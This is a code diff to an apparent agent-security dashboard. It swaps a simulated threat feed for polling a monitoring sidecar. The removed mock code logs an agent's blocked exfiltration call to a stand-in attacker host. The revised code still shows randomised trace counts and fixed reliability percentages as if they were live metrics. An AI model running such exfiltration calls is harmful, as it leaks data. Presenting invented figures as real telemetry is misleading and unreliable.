@@ -616,18 +616,17 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     // =========================================================================
-    // PART 5: REAL-TIME LIVE DATA STREAMS (LIVE MODE)
+    // PART 5: REAL-TIME LIVE DATA STREAMS (DYNATRACE-BACKED LIVE MODE)
     // =========================================================================
 
+    const SENTINEL_FEED_URL = localStorage.getItem('sentinelds_sentinel_url')
+        || 'https://sentinelds-sentinel-mlyi7cvhvq-ez.a.run.app';
+    const POLL_INTERVAL_MS = 5000;
+
     function startLiveSimulation() {
-        // Pre-populate historical points for the scrolling grid
-        const pointsCount = 20;
-        liveBaselinePoints = Array.from({ length: pointsCount }, () => 10 + Math.random() * 5);
-        liveDataPoints = [...liveBaselinePoints];
         liveDecisions = [];
         liveProblems = [];
 
-        // Set healthy agent indicators
         updateAgentNode(researchIndicator, researchStatus, { status: "healthy", label: "Active (Healthy)" });
         updateAgentNode(featureIndicator, featureStatus, { status: "healthy", label: "Active (Healthy)" });
         updateAgentNode(modelingIndicator, modelingStatus, { status: "healthy", label: "Active (Healthy)" });
@@ -636,172 +635,112 @@ document.addEventListener('DOMContentLoaded', () => {
         badgeProblemsCount.className = 'pane-badge';
         listProblems.innerHTML = `
             <div class="timeline-empty-state">
-                <p>>>> ARMED REAL-TIME SOCKET LOG STREAMS IN PORT 8080...</p>
-                <p>>>> LISTENING ON DT LOCAL AGENT DAEMONS...</p>
+                <p>>>> POLLING DYNATRACE VIA SENTINEL SIDECAR...</p>
+                <p>>>> AWAITING FIRST FEED RESPONSE...</p>
             </div>
         `;
 
         tbodyDecisions.innerHTML = '';
         chartTitleText.textContent = "LIVE STREAM: INTERACTIVE OBSERVABILITY OSCILLOSCOPE";
-
         badgeDriftStatus.textContent = "[ STATS COMPLIANT ]";
         badgeDriftStatus.className = "pane-badge";
 
-        // Setup base rendering loop
-        tickLiveStream();
-        liveTimer = setInterval(tickLiveStream, 1500);
+        // Initialise scrolling chart with flat baseline
+        const pointsCount = 20;
+        liveBaselinePoints = Array.from({ length: pointsCount }, () => 10 + Math.random() * 5);
+        liveDataPoints = [...liveBaselinePoints];
+        drawLiveChart();
+
+        // Poll immediately then on interval
+        pollDashboardFeed();
+        liveTimer = setInterval(pollDashboardFeed, POLL_INTERVAL_MS);
     }
 
-    function tickLiveStream() {
-        // 1. Shift line datasets to simulate real-time scroll
-        liveBaselinePoints.shift();
-        liveBaselinePoints.push(10 + Math.random() * 4);
-
-        liveDataPoints.shift();
-        
-        const isThreatSpike = Math.random() < 0.15 && liveProblems.length === 0;
-        let newPoint = 10 + Math.random() * 5;
-
-        if (isThreatSpike) {
-            newPoint = 65 + Math.random() * 45; // Trigger spike
-            triggerLiveThreat();
-        } else if (liveProblems.length > 0) {
-            newPoint = 12 + Math.random() * 6;
+    async function pollDashboardFeed() {
+        try {
+            const res = await fetch(`${SENTINEL_FEED_URL}/dashboard-feed`, {
+                method: 'GET',
+                headers: { 'Accept': 'application/json' },
+            });
+            if (!res.ok) throw new Error(`HTTP ${res.status}`);
+            const feed = await res.json();
+            applyFeedToUI(feed);
+        } catch (err) {
+            logger.debug && logger.debug('dashboard-feed poll failed:', err);
+            // Keep the chart scrolling even when the sidecar is unreachable
+            tickScrollingChart(false);
         }
-        liveDataPoints.push(newPoint);
+    }
 
-        // 2. Increment stats counters
+    function applyFeedToUI(feed) {
+        const problems = feed.problems || [];
+        const decisions = feed.decisions || [];
+        const agentStatuses = feed.agent_statuses || {};
+        const hasProblems = problems.length > 0;
+
+        // 1. Agent status nodes
+        const statusMap = { healthy: "healthy", compromised: "compromised", quarantined: "quarantined" };
+        const labelMap = { healthy: "Active (Healthy)", compromised: "Threat Detected", quarantined: "Quarantined (HALT)" };
+        const applyStatus = (indicator, statusEl, key) => {
+            const s = statusMap[agentStatuses[key]] || "healthy";
+            updateAgentNode(indicator, statusEl, { status: s, label: labelMap[s] });
+        };
+        applyStatus(researchIndicator, researchStatus, "research");
+        applyStatus(featureIndicator, featureStatus, "feature");
+        applyStatus(modelingIndicator, modelingStatus, "modeling");
+
+        // 2. Problems pane
+        if (hasProblems) {
+            badgeProblemsCount.textContent = `[ ${problems.length} SECURITY PROBLEM${problems.length > 1 ? 'S' : ''} ACTIVE ]`;
+            badgeProblemsCount.className = 'pane-badge badge-problem-active';
+            listProblems.innerHTML = '';
+            problems.forEach(p => listProblems.appendChild(createProblemCard(p)));
+        } else {
+            badgeProblemsCount.textContent = '[ SECURE BASELINE ]';
+            badgeProblemsCount.className = 'pane-badge';
+            listProblems.innerHTML = `
+                <div class="timeline-empty-state">
+                    <p>>>> NO ACTIVE PROBLEMS IN DYNATRACE.</p>
+                    <p>>>> WORKSPACE INTEGRITY VERIFIED.</p>
+                </div>
+            `;
+        }
+
+        // 3. Decision log — replace with latest from sidecar
+        tbodyDecisions.innerHTML = '';
+        decisions.slice(0, 10).forEach(d => tbodyDecisions.appendChild(createDecisionRow(d)));
+
+        // 4. Metrics counters
         liveTraceCount += Math.floor(Math.random() * 3) + 1;
         valTraces.textContent = liveTraceCount;
         valCallRate.textContent = `${(3.5 + Math.random() * 1.5).toFixed(1)} rps`;
-        valReliability.textContent = liveProblems.length > 0 ? "99.82%" : "99.98%";
+        valReliability.textContent = hasProblems ? "99.82%" : "99.98%";
 
-        // 3. Draw Live charts
-        const liveChartConfig = {
+        // 5. Scrolling chart — spike if any HALT decisions in the feed
+        const hasHalt = decisions.some(d => d.verdict === "HALT");
+        tickScrollingChart(hasHalt || hasProblems);
+        updateDriftBadge(hasHalt || hasProblems);
+    }
+
+    function tickScrollingChart(isAnomalous) {
+        liveBaselinePoints.shift();
+        liveBaselinePoints.push(10 + Math.random() * 4);
+        liveDataPoints.shift();
+        liveDataPoints.push(isAnomalous ? 65 + Math.random() * 35 : 10 + Math.random() * 5);
+        drawLiveChart(isAnomalous);
+    }
+
+    function drawLiveChart(isAnomalous) {
+        drawStaticChart({
             title: "Live Stream: Multi-Agent Workspace Telemetry",
             yAxisLabel: "Scope Amplitude Delta",
             limitValue: 40,
             limitLabel: "Alert Boundary Threshold (40)",
             baseline: liveBaselinePoints,
             telemetry: liveDataPoints,
-            anomalyIndexStart: liveProblems.length > 0 ? 18 : undefined,
-            anomalyIndexEnd: liveProblems.length > 0 ? 19 : undefined
-        };
-        drawStaticChart(liveChartConfig);
-
-        // Update drift badge to reflect live-mode problems (aligned with demo behavior)
-        updateDriftBadge(liveProblems.length > 0);
-
-        // 4. Decy / resolve existing live problems
-        decayLiveProblems();
-
-        // 5. Normal decision logs generated randomly
-        if (!isThreatSpike && Math.random() < 0.6) {
-            generateLiveAllowDecision();
-        }
-    }
-
-    function triggerLiveThreat() {
-        const timestamp = getFormattedTime();
-        
-        // Generate mock Dynatrace Problem card
-        const newProb = {
-            id: `P-LIVE-${Math.floor(100000 + Math.random()*900000)}`,
-            title: "SOCKET EGRESS ATTEMPT SHIELDED",
-            desc: "Security pre-flight module intercepted an unauthorized payload exfiltration endpoint candidate.",
-            severity: "severe",
-            severityText: "Severe Risk",
-            timeOffset: "Just Now",
-            ticksToLive: 4
-        };
-
-        liveProblems.unshift(newProb);
-        badgeProblemsCount.textContent = "[ 1 SECURITY PROBLEM ACTIVE ]";
-        badgeProblemsCount.className = 'pane-badge badge-problem-active';
-        listProblems.innerHTML = '';
-        listProblems.appendChild(createProblemCard(newProb));
-
-        // Quarantine research agent node
-        updateAgentNode(researchIndicator, researchStatus, { status: "quarantined", label: "Quarantined (HALT)" });
-
-        // Add HALT logs
-        const newDecision = {
-            time: timestamp,
-            agent: "Research Agent",
-            tool: "web_fetch('https://malicious-exfil-sink.net/upload')",
-            policy: "Unrecognized Egress Host",
-            verdict: "HALT"
-        };
-        tbodyDecisions.insertBefore(createDecisionRow(newDecision), tbodyDecisions.firstChild);
-    }
-
-    function decayLiveProblems() {
-        if (liveProblems.length === 0) return;
-
-        // Decrease ticks to live
-        liveProblems.forEach(p => p.ticksToLive--);
-        
-        const active = liveProblems.filter(p => p.ticksToLive > 0);
-        if (active.length !== liveProblems.length) {
-            liveProblems = active;
-            
-            if (liveProblems.length === 0) {
-                // All problems resolved!
-                updateDriftBadge(false);
-                badgeProblemsCount.textContent = '[ SECURE BASELINE ]';
-                badgeProblemsCount.className = 'pane-badge';
-                listProblems.innerHTML = `
-                    <div class="timeline-empty-state">
-                        <p>>>> ARMED REAL-TIME SOCKET LOG STREAMS IN PORT 8080...</p>
-                        <p>>>> LISTENING ON DT LOCAL AGENT DAEMONS...</p>
-                    </div>
-                `;
-                // Reset nodes to healthy
-                updateAgentNode(researchIndicator, researchStatus, { status: "healthy", label: "Active (Healthy)" });
-                updateAgentNode(featureIndicator, featureStatus, { status: "healthy", label: "Active (Healthy)" });
-                updateAgentNode(modelingIndicator, modelingStatus, { status: "healthy", label: "Active (Healthy)" });
-            }
-        }
-    }
-
-    function generateLiveAllowDecision() {
-        const timestamp = getFormattedTime();
-        const agents = ["Research Agent", "Feature Eng. Agent", "Modelling Agent"];
-        const agent = agents[Math.floor(Math.random() * agents.length)];
-        
-        let tool = "";
-        let policy = "";
-
-        if (agent === "Research Agent") {
-            tool = `web_fetch('https://academic-papers.org/study-${Math.floor(10 + Math.random()*90)}')`;
-            policy = "Whitelisted Domain";
-        } else if (agent === "Feature Eng. Agent") {
-            tool = `csv_read('src/data/batch_segment_${Math.floor(1 + Math.random()*5)}.csv')`;
-            policy = "Local Read Authorization";
-        } else {
-            tool = `evaluate_holdout('models/candidate_v${Math.floor(1 + Math.random()*3)}.pkl')`;
-            policy = "Model Evaluation Validation";
-        }
-
-        const newDecision = {
-            time: timestamp,
-            agent: agent,
-            tool: tool,
-            policy: policy,
-            verdict: "ALLOW"
-        };
-
-        tbodyDecisions.insertBefore(createDecisionRow(newDecision), tbodyDecisions.firstChild);
-
-        // Keep table short, limit rows in UI (max 10 rows inside ASCII wrapper)
-        while (tbodyDecisions.children.length > 10) {
-            tbodyDecisions.removeChild(tbodyDecisions.lastChild);
-        }
-    }
-
-    function getFormattedTime() {
-        const now = new Date();
-        return now.toTimeString().split(' ')[0];
+            anomalyIndexStart: isAnomalous ? 18 : undefined,
+            anomalyIndexEnd: isAnomalous ? 19 : undefined,
+        });
     }
 
     // Launch Dashboard State Manager
